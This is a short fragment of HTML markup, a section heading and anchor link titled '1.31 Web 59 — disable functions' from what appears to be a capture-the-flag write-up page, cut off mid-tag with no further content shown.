<h2 id="1-31-Web-59-—-disable-functions"><a href="#1-31-Web-59-—-disable-functions" class="headerlink" title="1.31 Web 59 — disabl